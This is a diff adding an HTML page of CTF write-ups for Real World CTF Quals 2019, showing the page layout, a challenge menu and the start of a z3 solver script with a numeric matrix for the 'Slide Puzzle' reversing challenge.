@@ -1,0 +1,830 @@
+<!DOCTYPE HTML>
+<!-- This page is modified from the template https://www.codeply.com/go/7XYosZ7VH5 by Carol Skelly (@iatek). -->
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>Real World CTF Quals 2019</title>
+    <link type="text/css" rel="stylesheet" href="../assets/css/github-markdown.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/pilcrow.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/hljs-github.min.css"/>
+    <link type="text/css" rel="stylesheet" href="../assets/css/bootstrap-4.0.0-beta.3.min.css">
+    <script type="text/javascript" src="../assets/js/jquery-3.3.1.slim.min.js"></script>
+    <script type="text/javascript" src="../assets/js/bootstrap-4.0.0-beta.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/popper-1.14.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/mathjax-2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+  </head>
+  <style>
+  body {
+      padding-top: 56px;
+  }
+
+  .sticky-offset {
+      top: 56px;
+  }
+
+  #body-row {
+      margin-left:0;
+      margin-right:0;
+  }
+  #sidebar-container {
+      min-height: 100vh;   
+      background-color: #333;
+      padding: 0;
+  }
+
+  /* Sidebar sizes when expanded and expanded */
+  .sidebar-expanded {
+      width: 230px;
+  }
+  .sidebar-collapsed {
+      width: 60px;
+  }
+
+  /* Menu item*/
+  #sidebar-container .list-group a {
+      height: 50px;
+      color: white;
+  }
+
+  /* Submenu item*/
+  #sidebar-container .list-group .sidebar-submenu a {
+      height: 45px;
+      padding-left: 60px;
+  }
+  .sidebar-submenu {
+      font-size: 0.9rem;
+  }
+
+  /* Separators */
+  .sidebar-separator-title {
+      background-color: #333;
+      height: 35px;
+  }
+  .sidebar-separator {
+      background-color: #333;
+      height: 25px;
+  }
+  .logo-separator {
+      background-color: #333;    
+      height: 60px;
+  }
+
+
+  /* 
+   active scrollspy
+  */
+  .list-group-item.active {
+    border-color: transparent;
+    border-left: #e69138 solid 4px;
+  }
+
+  /* 
+   anchor padding top
+   https://stackoverflow.com/a/28824157
+  */
+  :target:before {
+    content:"";
+    display:block;
+    height:56px; /* fixed header height*/
+    margin:-56px 0 0; /* negative fixed header height */
+  }
+  </style>
+  
+  <script>
+  // https://stackoverflow.com/a/48330533
+  $(window).on('activate.bs.scrollspy', function (event) {
+    let active_collapse = $($('.list-group-item.active').parents()[0]);
+    $(".collapse").removeClass("show");
+    active_collapse.addClass("show");
+
+    let parent_menu = $('a[href="#' + active_collapse[0].id + '"]');
+    $('a[href^="#submenu"]').css("border-left", "");
+    parent_menu.css("border-left","#e69138 solid 4px");
+  });
+
+  // http://docs.mathjax.org/en/latest/tex.html#tex-and-latex-math-delimiters
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      processEscapes: true
+    }
+  });
+  </script>
+
+  <body style="position: relative;" data-spy="scroll" data-target=".sidebar-submenu" data-offset="70">
+    <nav class="navbar navbar-expand-md navbar-light bg-light fixed-top">
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <a class="navbar-brand" href="https://github.com/balsn/ctf_writeup">
+        <img src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" class="d-inline-block align-top" alt="" width="30" height="30">
+        <span class="menu-collapsed">balsn / ctf_writeup</span>
+      </a>
+      <div class="collapse navbar-collapse" id="navbarNavDropdown">
+        <ul class="navbar-nav my-2 my-lg-0">
+            
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+        
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                rev
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#slide-puzzle">slide-puzzle</a>
+    
+                <a class="dropdown-item" href="#caidanti">caidanti</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                pwn
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#across-the-great-wall">across-the-great-wall</a>
+    
+                <a class="dropdown-item" href="#fax-sender">fax-sender</a>
+    
+                <a class="dropdown-item" href="#mop">mop</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                web
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#crawl-box-(unsolved)">crawl-box-(unsolved)</a>
+    
+                <a class="dropdown-item" href="#mission-invisible">mission-invisible</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                crypto
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#bank">bank</a>
+    
+              </div>
+            </li>
+    
+        </ul>
+      </div>
+      <div class="navbar-collapse collapse w-100 order-3 dual-collapse2">
+        <ul class="navbar-nav ml-auto">
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+        </ul>
+      </div>
+    </nav>
+    <div class="row" id="body-row">
+      <div id="sidebar-container" class="sidebar-expanded d-none d-md-block col-2">
+        <ul class="list-group sticky-top sticky-offset">
+          
+          <a href="#submenu0" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">rev</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu0" class="collapse sidebar-submenu">
+            <a href="#slide-puzzle" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">slide-puzzle</span>
+            </a>
+    
+<a href="#caidanti" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">caidanti</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu1" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">pwn</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu1" class="collapse sidebar-submenu">
+            <a href="#across-the-great-wall" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">across-the-great-wall</span>
+            </a>
+    
+<a href="#fax-sender" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">fax-sender</span>
+            </a>
+    
+<a href="#mop" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">mop</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu2" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">web</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu2" class="collapse sidebar-submenu">
+            <a href="#crawl-box-(unsolved)" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">crawl-box-(unsolved)</span>
+            </a>
+    
+<a href="#mission-invisible" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">mission-invisible</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu3" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">crypto</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu3" class="collapse sidebar-submenu">
+            <a href="#bank" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">bank</span>
+            </a>
+    
+          </div>
+    
+        </ul>
+      </div>
+      <div class="col-10 py-3">
+        <article class="markdown-body"><h1 id="real-world-ctf-quals-2019"><a class="header-link" href="#real-world-ctf-quals-2019"></a>Real World CTF Quals 2019</h1>
+
+<h2 id="rev"><a class="header-link" href="#rev"></a>Rev</h2>
+<h3 id="slide-puzzle"><a class="header-link" href="#slide-puzzle"></a>Slide Puzzle</h3>
+<pre class="hljs"><code>from z3 import *
+
+mat=[[<span class="hljs-number">236</span>, <span class="hljs-number">214</span>, <span class="hljs-number">41</span>, <span class="hljs-number">206</span>, <span class="hljs-number">144</span>, <span class="hljs-number">20</span>, <span class="hljs-number">171</span>, <span class="hljs-number">71</span>, <span class="hljs-number">136</span>, <span class="hljs-number">223</span>, <span class="hljs-number">112</span>, <span class="hljs-number">119</span>, <span class="hljs-number">82</span>, <span class="hljs-number">84</span>, <span class="hljs-number">129</span>, <span class="hljs-number">160</span>, <span class="hljs-number">31</span>, <span class="hljs-number">66</span>, <span class="hljs-number">156</span>, <span class="hljs-number">43</span>, <span class="hljs-number">213</span>, <span class="hljs-number">16</span>, <span class="hljs-number">235</span>, <span class="hljs-number">123</span>, <span class="hljs-number">249</span>, <span class="hljs-number">17</span>, <span class="hljs-number">111</span>, <span class="hljs-number">12</span>, <span class="hljs-number">186</span>, <span class="hljs-number">169</span>, <span class="hljs-number">168</span>, <span class="hljs-number">123</span>, <span class="hljs-number">100</span>, <span class="hljs-number">215</span>, <span class="hljs-number">7</span>],
+[<span class="hljs-number">37</span>, <span class="hljs-number">226</span>, <span class="hljs-number">208</span>, <span class="hljs-number">205</span>, <span class="hljs-number">100</span>, <span class="hljs-number">142</span>, <span class="hljs-number">9</span>, <span class="hljs-number">222</span>, <span class="hljs-number">136</span>, <span class="hljs-number">62</span>, <span class="hljs-number">161</span>, <span class="hljs-number">52</span>, <span class="hljs-number">161</span>, <span class="hljs-number">197</span>, <span class="hljs-number">53</span>, <span class="hljs-number">114</span>, <span class="hljs-number">89</span>, <span class="hljs-number">73</span>, <span class="hljs-number">129</span>, <span class="hljs-number">202</span>, <span class="hljs-number">228</span>, <span class="hljs-number">226</span>, <span class="hljs-number">93</span>, <span class="hljs-number">75</span>, <span class="hljs-number">248</span>, <span class="hljs-number">213</span>, <span class="hljs-number">13</span>, <span class="hljs-number">93</span>, <span class="hljs-number">204</span>, <span class="hljs-number">210</span>, <span class="hljs-number">46</span>, <span class="hljs-number">160</span>, <span class="hljs-number">142</span>, <span class="hljs-number">153</span>, <span class="hljs-number">44</span>],
+[<span class="hljs-number">131</span>, <span class="hljs-number">134</span>, <span class="hljs-number">39</span>, <span class="hljs-number">63</span>, <span class="hljs-number">98</span>, <span class="hljs-number">205</span>, <span class="hljs-number">32</span>, <span class="hljs-number">193</span>, <span class="hljs-number">128</span>, <span class="hljs-number">186</span>, <span class="hljs-number">167</span>, <span class="hljs-number">149</span>, <span class="hljs-number">244</span>, <span class="hljs-number">136</span>, <span class="hljs-number">245</span>, <span class="hljs-number">255</span>, <span class="hljs-number">51</span>, <span class="hljs-number">220</span>, <span class="hljs-number">193</span>, <span class="hljs-number">57</span>, <span class="hljs-number">93</span>, <span class="hljs-number">213</span>, <span class="hljs-number">226</span>, <span class="hljs-number">196</span>, <span class="hljs-number">18</span>, <span class="hljs-number">63</span>, <span class="hljs-number">203</span>, <span class="hljs-number">106</span>, <span class="hljs-number">213</span>, <span class="hljs-number">202</span>, <span class="hljs-number">234</span>, <span class="hljs-number">138</span>, <span class="hljs-number">209</span>, <span class="hljs-number">176</span>, <span class="hljs-number">204</span>],
+[<span class="hljs-number">118</span>, <span class="hljs-number">70</span>, <span class="hljs-number">246</span>, <span class="hljs-number">109</span>, <span class="hljs-number">241</span>, <span class="hljs-number">116</span>, <span class="hljs-number">17</span>, <span class="hljs-number">90</span>, <span class="hljs-number">240</span>, <span class="hljs-number">119</span>, <span class="hljs-number">89</span>, <span class="hljs-number">221</span>, <span class="hljs-number">166</span>, <span class="hljs-number">203</span>, <span class="hljs-number">190</span>, <span class="hljs-number">161</span>, <span class="hljs-number">101</span>, <span class="hljs-number">1</span>, <span class="hljs-number">216</span>, <span class="hljs-number">195</span>, <span class="hljs-number">50</span>, <span class="hljs-number">201</span>, <span class="hljs-number">63</span>, <span class="hljs-number">229</span>, <span class="hljs-number">237</span>, <span class="hljs-number">105</span>, <span class="hljs-number">32</span>, <span class="hljs-number">63</span>, <span class="hljs-number">253</span>, <span class="hljs-number">72</span>, <span class="hljs-number">86</span>, <span class="hljs-number">119</span>, <span class="hljs-number">184</span>, <span class="hljs-number">47</span>, <span class="hljs-number">244</span>],
+[<span class="hljs-number">220</span>, <span class="hljs-number">164</span>, <span class="hljs-number">221</span>, <span class="hljs-number">62</span>, <span class="hljs-number">14</span>, <span class="hljs-number">154</span>, <span class="hljs-number">191</span>, <span class="hljs-number">133</span>, <span class="hljs-number">208</span>, <span class="hljs-number">99</span>, <span class="hljs-number">89</span>, <span class="hljs-number">153</span>, <span class="hljs-number">126</span>, <span class="hljs-number">93</span>, <span class="hljs-number">49</span>, <span class="hljs-number">179</span>, <span class="hljs-number">38</span>, <span class="hljs-number">193</span>, <span class="hljs-number">61</span>, <span class="hljs-number">93</span>, <span class="hljs-number">190</span>, <span class="hljs-number">76</span>, <span class="hljs-number">28</span>, <span class="hljs-number">27</span>, <span class="hljs-number">232</span>, <span class="hljs-number">37</span>, <span class="hljs-number">154</span>, <span class="hljs-number">34</span>, <span class="hljs-number">114</span>, <span class="hljs-number">109</span>, <span class="hljs-number">82</span>, <span class="hljs-number">122</span>, <span class="hljs-number">145</span>, <span class="hljs-number">98</span>, <span class="hljs-number">131</span>],
+[<span class="hljs-number">15</span>, <span class="hljs-number">183</span>, <span class="hljs-number">127</span>, <span class="hljs-number">102</span>, <span class="hljs-number">180</span>, <span class="hljs-number">94</span>, <span class="hljs-number">117</span>, <span class="hljs-number">81</span>, <span class="hljs-number">209</span>, <span class="hljs-number">161</span>, <span class="hljs-number">25</span>, <span class="hljs-number">134</span>, <span class="hljs-number">177</span>, <span class="hljs-number">118</span>, <span class="hljs-number">158</span>, <span class="hljs-number">201</span>, <span class="hljs-number">8</span>, <span class="hljs-number">201</span>, <span class="hljs-number">19</span>, <span class="hljs-number">120</span>, <span class="hljs-number">241</span>, <span class="hljs-number">192</span>, <span class="hljs-number">79</span>, <span class="hljs-number">216</span>, <span class="hljs-number">108</span>, <span class="hljs-number">222</span>, <span class="hljs-number">241</span>, <span class="hljs-number">202</span>, <span class="hljs-number">139</span>, <span class="hljs-number">188</span>, <span class="hljs-number">86</span>, <span class="hljs-number">232</span>, <span class="hljs-number">159</span>, <span class="hljs-number">82</span>, <span class="hljs-number">135</span>],
+[<span class="hljs-number">251</span>, <span class="hljs-number">15</span>, <span class="hljs-number">113</span>, <span class="hljs-number">10</span>, <span class="hljs-number">229</span>, <span class="hljs-number">206</span>, <span class="hljs-number">95</span>, <span class="hljs-number">67</span>, <span class="hljs-number">2</span>, <span class="hljs-number">34</span>, <span class="hljs-number">242</span>, <span class="hljs-number">124</span>, <span class="hljs-number">252</span>, <span class="hljs-number">231</span>, <span class="hljs-number">168</span>, <span class="hljs-number">48</span>, <span class="hljs-number">145</span>, <span class="hljs-number">176</span>, <span class="hljs-number">54</span>, <span class="hljs-number">141</span>, <span class="hljs-number">100</span>, <span class="hljs-number">199</span>, <span class="hljs-number">255</span>, <span class="hljs-number">57</span>, <span class="hljs-number">60</span>, <span class="hljs-number">168</span>, <span class="hljs-number">64</span>, <span class="hljs-number">16</span>, <span class="hljs-number">249</span>, <span class="hljs-number">90</span>, <span class="hljs-number">173</span>, <span class="hljs-number">48</span>, <span class="hljs-number">19</span>, <span class="hljs-number">213</span>, <span class="hljs-number">153</span>],
+[<span class="hljs-number">102</span>, <span class="hljs-number">176</span>, <span class="hljs-number">252</span>, <span class="hljs-number">137</span>, <span class="hljs-number">161</span>, <span class="hljs-number">198</span>, <span class="hljs-number">135</span>, <span class="hljs-number">197</span>, <span class="hljs-number">121</span>, <span class="hljs-number">29</span>, <span class="hljs-number">181</span>, <span class="hljs-number">26</span>, <span class="hljs-number">188</span>, <span class="hljs-number">69</span>, <span class="hljs-number">111</span>, <span class="hljs-number">26</span>, <span class="hljs-number">237</span>, <span class="hljs-number">30</span>, <span class="hljs-number">139</span>, <span class="hljs-number">81</span>, <span class="hljs-number">154</span>, <span class="hljs-number">49</span>, <span class="hljs-number">85</span>, <span class="hljs-number">78</span>, <span class="hljs-number">106</span>, <span class="hljs-number">163</span>, <span class="hljs-number">202</span>, <span class="hljs-number">124</span>, <span class="hljs-number">134</span>, <span class="hljs-number">96</span>, <span class="hljs-number">84</span>, <span class="hljs-number">14</span>, <span class="hljs-number">86</span>, <span class="hljs-number">9</span>, <span class="hljs-number">163</span>],
+[<span class="hljs-number">183</span>, <span class="hljs-number">197</span>, <span class="hljs-number">240</span>, <span class="hljs-number">41</span>, <span class="hljs-number">108</span>, <span class="hljs-number">162</span>, <span class="hljs-number">152</span>, <span class="hljs-number">60</span>, <span class="hljs-number">11</span>, <span class="hljs-number">166</span>, <span class="hljs-number">112</span>, <span class="hljs-number">140</span>, <span class="hljs-number">151</span>, <span class="hljs-number">220</span>, <span class="hljs-number">68</span>, <span class="hljs-number">29</span>, <span class="hljs-number">42</span>, <span class="hljs-number">216</span>, <span class="hljs-number">189</span>, <span class="hljs-number">109</span>, <span class="hljs-number">151</span>, <span class="hljs-number">4</span>, <span class="hljs-number">182</span>, <span class="hljs-number">15</span>, <span class="hljs-number">220</span>, <span class="hljs-number">28</span>, <span class="hljs-number">238</span>, <span class="hljs-number">110</span>, <span class="hljs-number">194</span>, <span class="hljs-number">130</span>, <span class="hljs-number">74</span>, <span class="hljs-number">22</span>, <span class="hljs-number">166</span>, <span class="hljs-number">252</span>, <span class="hljs-number">223</span>],
+[<span class="hljs-number">36</span>, <span class="hljs-number">194</span>, <span class="hljs-number">83</span>, <span class="hljs-number">121</span>, <span class="hljs-number">193</span>, <span class="hljs-number">233</span>, <span class="hljs-number">162</span>, <span class="hljs-number">226</span>, <span class="hljs-number">232</span>, <span class="hljs-number">140</span>, <span class="hljs-number">83</span>, <span class="hljs-number">60</span>, <span class="hljs-number">133</span>, <span class="hljs-number">255</span>, <span class="hljs-number">29</span>, <span class="hljs-number">141</span>, <span class="hljs-number">28</span>, <span class="hljs-number">188</span>, <span class="hljs-number">76</span>, <span class="hljs-number">51</span>, <span class="hljs-number">91</span>, <span class="hljs-number">245</span>, <span class="hljs-number">176</span>, <span class="hljs-number">44</span>, <span class="hljs-number">118</span>, <span class="hljs-number">166</span>, <span class="hljs-number">173</span>, <span class="hljs-number">139</span>, <span class="hljs-number">83</span>, <span class="hljs-number">69</span>, <span class="hljs-number">3</span>, <span class="hljs-number">49</span>, <span class="hljs-number">117</span>, <span class="hljs-number">41</span>, <span class="hljs-number">27</span>],
+ [<span class="hljs-number">45</span>, <span class="hljs-number">86</span>, <span class="hljs-number">61</span>, <span class="hljs-number">176</span>, <span class="hljs-number">54</span>, <span class="hljs-number">103</span>, <span class="hljs-number">234</span>, <span class="hljs-number">166</span>, <span class="hljs-number">159</span>, <span class="hljs-number">57</span>, <span class="hljs-number">48</span>, <span class="hljs-number">172</span>, <span class="hljs-number">68</span>, <span class="hljs-number">89</span>, <span class="hljs-number">62</span>, <span class="hljs-number">4</span>, <span class="hljs-number">133</span>, <span class="hljs-number">148</span>, <span class="hljs-number">94</span>, <span class="hljs-number">110</span>, <span class="hljs-number">150</span>, <span class="hljs-number">28</span>, <span class="hljs-number">104</span>, <span class="hljs-number">106</span>, <span class="hljs-number">204</span>, <span class="hljs-number">208</span>, <span class="hljs-number">98</span>, <span class="hljs-number">171</span>, <span class="hljs-number">104</span>, <span class="hljs-number">20</span>, <span class="hljs-number">249</span>, <span class="hljs-number">108</span>, <span class="hljs-number">83</span>, <span class="hljs-number">240</span>, <span class="hljs-number">109</span>],
+[<span class="hljs-number">101</span>, <span class="hljs-number">167</span>, <span class="hljs-number">103</span>, <span class="hljs-number">201</span>, <span class="hljs-number">230</span>, <span class="hljs-number">60</span>, <span class="hljs-number">48</span>, <span class="hljs-number">228</span>, <span class="hljs-number">52</span>, <span class="hljs-number">162</span>, <span class="hljs-number">73</span>, <span class="hljs-number">184</span>, <span class="hljs-number">193</span>, <span class="hljs-number">103</span>, <span class="hljs-number">18</span>, <span class="hljs-number">23</span>, <span class="hljs-number">25</span>, <span class="hljs-number">115</span>, <span class="hljs-number">190</span>, <span class="hljs-number">41</span>, <span class="hljs-number">189</span>, <span class="hljs-number">50</span>, <span class="hljs-number">241</span>, <span class="hljs-number">253</span>, <span class="hljs-number">233</span>, <span class="hljs-number">72</span>, <span class="hljs-number">252</span>, <span class="hljs-number">25</span>, <span class="hljs-number">8</span>, <span class="hljs-number">203</span>, <span class="hljs-number">246</span>, <span class="hljs-number">227</span>, <span class="hljs-number">127</span>, <span class="hljs-number">228</span>, <span class="hljs-number">43</span>],
+[<span class="hljs-number">183</span>, <span class="hljs-number">80</span>, <span class="hljs-number">117</span>, <span class="hljs-number">153</span>, <span class="hljs-number">67</span>, <span class="hljs-number">44</span>, <span class="hljs-number">125</span>, <span class="hljs-number">178</span>, <span class="hljs-number">235</span>, <span class="hljs-number">4</span>, <span class="hljs-number">24</span>, <span class="hljs-number">15</span>, <span class="hljs-number">124</span>, <span class="hljs-number">103</span>, <span class="hljs-number">247</span>, <span class="hljs-number">101</span>, <span class="hljs-number">165</span>, <span class="hljs-number">89</span>, <span class="hljs-number">18</span>, <span class="hljs-number">10</span>, <span class="hljs-number">73</span>, <span class="hljs-number">108</span>, <span class="hljs-number">115</span>, <span class="hljs-number">181</span>, <span class="hljs-number">132</span>, <span class="hljs-number">245</span>, <span class="hljs-number">213</span>, <span class="hljs-number">138</span>, <span class="hljs-number">98</span>, <span class="hljs-number">174</span>, <span class="hljs-number">230</span>, <span class="hljs-number">204</span>, <span class="hljs-number">245</span>, <span class="hljs-number">226</span>, <span class="hljs-number">129</span>],
+[<span class="hljs-number">120</span>, <span class="hljs-number">83</span>, <span class="hljs-number">116</span>, <span class="hljs-number">215</span>, <span class="hljs-number">172</span>, <span class="hljs-number">75</span>, <span class="hljs-number">105</span>, <span class="hljs-number">204</span>, <span class="hljs-number">221</span>, <span class="hljs-number">146</span>, <span class="hljs-number">72</span>, <span class="hljs-number">99</span>, <span class="hljs-number">173</span>, <span class="hljs-number">88</span>, <span class="hljs-number">69</span>, <span class="hljs-number">17</span>, <span class="hljs-number">244</span>, <span class="hljs-number">126</span>, <span class="hljs-number">162</span>, <span class="hljs-number">111</span>, <span class="hljs-number">234</span>, <span class="hljs-number">89</span>, <span class="hljs-number">29</span>, <span class="hljs-number">91</span>, <span class="hljs-number">177</span>, <span class="hljs-number">210</span>, <span class="hljs-number">179</span>, <span class="hljs-number">156</span>, <span class="hljs-number">192</span>, <span class="hljs-number">54</span>, <span class="hljs-number">97</span>, <span class="hljs-number">124</span>, <span class="hljs-number">137</span>, <span class="hljs-number">18</span>, <span class="hljs-number">89</span>],
+[<span class="hljs-number">144</span>, <span class="hljs-number">128</span>, <span class="hljs-number">185</span>, <span class="hljs-number">144</span>, <span class="hljs-number">234</span>, <span class="hljs-number">20</span>, <span class="hljs-number">137</span>, <span class="hljs-number">110</span>, <span class="hljs-number">164</span>, <span class="hljs-number">104</span>, <span class="hljs-number">38</span>, <span class="hljs-number">77</span>, <span class="hljs-number">224</span>, <span class="hljs-number">182</span>, <span class="hljs-number">96</span>, <span class="hljs-number">169</span>, <span class="hljs-number">15</span>, <span class="hljs-number">64</span>, <span class="hljs-number">187</span>, <span class="hljs-number">151</span>, <span class="hljs-number">171</span>, <span class="hljs-number">196</span>, <span class="hljs-number">164</span>, <span class="hljs-number">125</span>, <span class="hljs-number">111</span>, <span class="hljs-number">90</span>, <span class="hljs-number">135</span>, <span class="hljs-number">83</span>, <span class="hljs-number">1</span>, <span class="hljs-number">181</span>, <span class="hljs-number">170</span>, <span class="hljs-number">80</span>, <span class="hljs-number">5</span>, <span class="hljs-number">141</span>, <span class="hljs-number">145</span>],
+[<span class="hljs-number">153</span>, <span class="hljs-number">199</span>, <span class="hljs-number">233</span>, <span class="hljs-number">200</span>, <span class="hljs-number">217</span>, <span class="hljs-number">155</span>, <span class="hljs-number">65</span>, <span class="hljs-number">33</span>, <span class="hljs-number">140</span>, <span class="hljs-number">145</span>, <span class="hljs-number">144</span>, <span class="hljs-number">131</span>, <span class="hljs-number">72</span>, <span class="hljs-number">151</span>, <span class="hljs-number">86</span>, <span class="hljs-number">145</span>, <span class="hljs-number">94</span>, <span class="hljs-number">57</span>, <span class="hljs-number">84</span>, <span class="hljs-number">135</span>, <span class="hljs-number">218</span>, <span class="hljs-number">117</span>, <span class="hljs-number">148</span>, <span class="hljs-number">48</span>, <span class="hljs-number">35</span>, <span class="hljs-number">173</span>, <span class="hljs-number">33</span>, <span class="hljs-number">210</span>, <span class="hljs-number">41</span>, <span class="hljs-number">97</span>, <span class="hljs-number">86</span>, <span class="hljs-number">165</span>, <span class="hljs-number">189</span>, <span class="hljs-number">207</span>, <span class="hljs-number">22</span>],
+[<span class="hljs-number">77</span>, <span class="hljs-number">160</span>, <span class="hljs-number">73</span>, <span class="hljs-number">92</span>, <span class="hljs-number">151</span>, <span class="hljs-number">178</span>, <span class="hljs-number">245</span>, <span class="hljs-number">29</span>, <span class="hljs-number">120</span>, <span class="hljs-number">54</span>, <span class="hljs-number">120</span>, <span class="hljs-number">184</span>, <span class="hljs-number">60</span>, <span class="hljs-number">48</span>, <span class="hljs-number">7</span>, <span class="hljs-number">246</span>, <span class="hljs-number">131</span>, <span class="hljs-number">130</span>, <span class="hljs-number">40</span>, <span class="hljs-number">62</span>, <span class="hljs-number">215</span>, <span class="hljs-number">126</span>, <span class="hljs-number">176</span>, <span class="hljs-number">82</span>, <span class="hljs-number">177</span>, <span class="hljs-number">14</span>, <span class="hljs-number">40</span>, <span class="hljs-number">165</span>, <span class="hljs-number">171</span>, <span class="hljs-number">185</span>, <span class="hljs-number">213</span>, <span class="hljs-number">148</span>, <span class="hljs-number">255</span>, <span class="hljs-number">157</span>, <span class="hljs-number">190</span>],
+[<span class="hljs-number">122</span>, <span class="hljs-number">104</span>, <span class="hljs-number">85</span>, <span class="hljs-number">1</span>, <span class="hljs-number">27</span>, <span class="hljs-number">47</span>, <span class="hljs-number">53</span>, <span class="hljs-number">133</span>, <span class="hljs-number">121</span>, <span class="hljs-number">66</span>, <span class="hljs-number">212</span>, <span class="hljs-number">126</span>, <span class="hljs-number">230</span>, <span class="hljs-number">63</span>, <span class="hljs-number">153</span>, <span class="hljs-number">219</span>, <span class="hljs-number">8</span>, <span class="hljs-number">23</span>, <span class="hljs-number">251</span>, <span class="hljs-number">83</span>, <span class="hljs-number">167</span>, <span class="hljs-number">190</span>, <span class="hljs-number">3</span>, <span class="hljs-number">217</span>, <span class="hljs-number">96</span>, <span class="hljs-number">248</span>, <span class="hljs-number">0</span>, <span class="hljs-number">247</span>, <span class="hljs-number">10</span>, <span class="hljs-number">224</span>, <span class="hljs-number">18</span>, <span class="hljs-number">27</span>, <span class="hljs-number">23</span>, <span class="hljs-number">58</span>, <span class="hljs-number">59</span>],
+[<span class="hljs-number">163</span>, <span class="hljs-number">93</span>, <span class="hljs-number">143</span>, <span class="hljs-number">1</span>, <span class="hljs-number">251</span>, <span class="hljs-number">92</span>, <span class="hljs-number">247</span>, <span class="hljs-number">141</span>, <span class="hljs-number">58</span>, <span class="hljs-number">228</span>, <span class="hljs-number">141</span>, <span class="hljs-number">93</span>, <span class="hljs-number">107</span>, <span class="hljs-number">51</span>, <span class="hljs-number">219</span>, <span class="hljs-number">93</span>, <span class="hljs-number">184</span>, <span class="hljs-number">187</span>, <span class="hljs-number">238</span>, <span class="hljs-number">31</span>, <span class="hljs-number">38</span>, <span class="hljs-number">148</span>, <span class="hljs-number">204</span>, <span class="hljs-number">119</span>, <span class="hljs-number">57</span>, <span class="hljs-number">13</span>, <span class="hljs-number">210</span>, <span class="hljs-number">249</span>, <span class="hljs-number">175</span>, <span class="hljs-number">13</span>, <span class="hljs-number">38</span>, <span class="hljs-number">57</span>, <span class="hljs-number">86</span>, <span class="hljs-number">57</span>, <span class="hljs-number">243</span>],
